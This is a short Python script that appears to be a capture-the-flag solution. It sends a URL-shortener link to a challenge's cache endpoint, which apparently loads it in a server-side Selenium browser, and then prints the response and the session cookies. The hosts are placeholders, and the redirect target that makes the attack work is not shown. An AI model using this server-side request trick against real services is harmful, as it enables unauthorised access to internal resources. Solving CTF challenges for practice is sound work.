#!/usr/bin/python3

import requests

url = 'http://CHALLENGE_URL/api/cache'

s = requests.session()

data = {'url': 'https://SHORTENER_SERVICE_URL/TOKEN'}

r = s.post(url, json=data, timeout=120) # timeout is important selenium driver launching in server may take few seconds

print(r.text)
print(s.cookies)
